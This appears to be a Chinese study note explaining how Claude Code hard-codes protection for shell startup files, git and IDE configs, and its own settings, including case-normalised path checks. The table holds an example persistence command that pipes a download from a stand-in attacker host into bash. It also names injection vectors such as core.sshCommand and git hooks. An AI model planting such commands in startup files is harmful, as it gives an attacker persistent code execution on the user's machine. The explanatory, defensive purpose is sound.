> [!abstract] 核心问题
> AI 能编辑你项目里的代码文件，但有些文件一旦被修改，后果远比改坏一段代码严重得多。Claude Code 怎么划定这条"绝对不能碰"的红线？

## 为什么有些文件需要"绝对保护"？

普通的代码文件（比如 `app.js`）被 AI 改坏了，最多就是程序报错，你 `git checkout` 恢复一下就行。但有一类文件不同——它们不是"你的代码"，而是"你的电脑怎么运行"的配置。改了这些文件，后果可能是：

- **你的终端每次打开都执行恶意代码**（Shell 配置文件）
- **你每次 git commit 都触发一段后门程序**（Git 钩子）
- **你的 IDE 悄悄运行了攻击者的脚本**（VS Code / JetBrains 配置）
- **Claude Code 自己的安全设置被关掉**（Claude 配置文件）

这些文件的共同特点是：**它们会在你不知情的情况下被自动执行**。

## 被保护的文件清单

源码位置：`src/utils/permissions/filesystem.ts:57-68`

| 文件名 | 干什么用的 | 为什么危险 |
|--------|-----------|-----------|
| `.bashrc` | Bash 每次打开时自动运行的脚本 | 加一行 `curl evil.com/steal \| bash`，以后每次打开终端都会执行 |
| `.bash_profile` | Bash 登录时运行的脚本 | 同上，但只在登录时触发 |
| `.zshrc` | Zsh（macOS 默认 shell）的启动脚本 | 同 `.bashrc`，针对 Zsh 用户 |
| `.zprofile` | Zsh 登录脚本 | 同 `.bash_profile`，针对 Zsh |
| `.profile` | 通用 Shell 登录脚本 | 多种 Shell 共用的启动配置 |
| `.gitconfig` | Git 的全局配置 | 可以设置 `core.sshCommand` 让 git 操作时执行任意命令 |
| `.gitmodules` | Git 子模块配置 | 可以引入一个恶意的外部仓库 |
| `.ripgreprc` | ripgrep（搜索工具）的配置 | Claude Code 用 ripgrep 搜索文件，被篡改可能影响搜索行为 |
| `.mcp.json` | MCP 服务器配置 | 可以添加恶意的 MCP 服务器，让 AI 连接到不安全的外部服务 |
| `.claude.json` | Claude Code 的项目配置 | 可以修改 Claude Code 的行为方式 |

> [!warning] 这个保护是不可绕过的
> 即使你用 `--dangerously-skip-permissions` 启动 Claude Code（全权模式），AI 也无法自动修改这些文件。系统会强制弹出确认对话框。这是**硬编码**在代码里的，不受任何配置控制。

## 被保护的目录清单

源码位置：`src/utils/permissions/filesystem.ts:74-79`

| 目录名 | 干什么用的 | 为什么整个目录都被保护 |
|--------|-----------|-------------------|
| `.git` | Git 的内部数据目录 | 里面的 `hooks/` 子目录包含各种自动执行的脚本（pre-commit、post-merge 等）。修改 `.git/config` 也能注入命令 |
| `.vscode` | VS Code 的项目配置 | `settings.json` 中的某些配置项可以触发代码执行（比如 `terminal.integrated.shellArgs`） |
| `.idea` | JetBrains IDE（IntelliJ / WebStorm 等）的配置 | 类似 VS Code，IDE 配置中有可以执行命令的选项 |
| `.claude` | Claude Code 自己的配置目录 | 包含 `settings.json`（权限设置）、`commands/`（自定义命令）、`hooks/`（钩子脚本）等敏感内容 |

### `.claude` 目录的特殊例外

`.claude` 目录下有一个子目录是被允许自动读写的：`.claude/worktrees/`。

这是因为 Claude Code 的 Worktree（工作树）功能需要在这里创建和管理 Git 工作副本，属于 Claude Code 自身的正常运作需要。源码中做了明确的特殊处理：

```
如果当前路径段是 .claude
  → 看下一段是不是 worktrees
    → 是 → 跳过这个 .claude 检查，继续
    → 不是 → 标记为危险
```

## 大小写绕过防护

在 macOS 和 Windows 上，文件系统不区分大小写。也就是说 `.Git`、`.GIT`、`.gIt` 都指向同一个目录。如果安全检查只用精确匹配 `.git`，攻击者只要把大小写改一下就绕过了。

Claude Code 的做法（`filesystem.ts:90-92`）：

> 所有路径在做安全比较之前，先统一转成小写。不管你怎么变换大小写，都会匹配到保护列表。

这也是为什么函数名叫 `normalizeCaseForComparison`——"为了比较而把大小写统一"。

## Claude 配置文件的额外保护

除了上面的通用保护，Claude Code 对自身配置文件还有一层专门的检查（`isClaudeSettingsPath` 函数）。它会检测：

1. 任何以 `/.claude/settings.json` 或 `/.claude/settings.local.json` 结尾的路径——不只是当前项目的，**任何项目的** Claude 配置都受保护
2. `.claude/commands/` 目录——用户自定义的斜杠命令
3. `.claude/agents/` 目录——用户自定义的 Agent 配置
4. `.claude/skills/` 目录——用户自定义的技能文件

对这些路径的写操作，即使在 `acceptEdits` 模式下也会强制弹出确认。

> [!tip] 设计启示
> 保护列表的设计思路不是"什么命令危险"，而是"什么文件一旦被改就能产生持久化的影响"。Shell 配置、Git 钩子、IDE 设置——它们的共同点是**会在未来某个时刻自动执行**，用户可能完全不知道。这给 AI Agent 产品的启示是：**识别"写一次、执行多次"的资源，对它们施加额外保护**。
